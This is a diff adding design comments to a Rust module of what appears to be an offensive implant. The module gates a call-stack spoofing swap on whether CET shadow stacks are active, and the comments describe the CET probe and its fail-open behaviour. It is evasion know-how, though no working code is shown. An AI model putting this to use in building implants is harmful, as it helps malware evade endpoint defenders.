@@ -10,6 +10,22 @@
 //! This module is the pure decision: given the runtime posture (CET on? gaps
 //! usable?), decide whether to EXECUTE the swap or DEGRADE. The decision is
 //! deliberately pessimistic — when in doubt, degrade (never risk a #CP).
+//!
+//! ## Consistency with the live path (audited 2026-08)
+//! The ONLY live consumer is `nyx_implant_core::stack::with_spoofed_stack`,
+//! which calls `should_execute(cet_active(), gaps.is_usable())` immediately
+//! before the `mov rsp` swap — there is no second, divergent copy of this
+//! logic. The `cet_on` input comes from
+//! `nyx_implant_core::version::cet_active()`, which queries
+//! `IsProcessorFeaturePresent(41)` — the SAME export + constant as
+//! `nyx_implant_evasion::caller_spoof::is_cet_enabled`, so the swap gate and
+//! the evasion-side CET gates can never disagree about the bit.
+//!
+//! Caveat on "pessimistic": the DECISION is pessimistic given accurate
+//! inputs, but both probes fail OPEN on resolver failure (they return
+//! "CET off" when the export can't be resolved). That is deliberate — a
+//! missing kernel32 export is far more likely than a silently-on CET — but
+//! it means the fail-safe here lives in the decision table, not the probe.
 
 #![cfg_attr(not(test), allow(dead_code))]
 
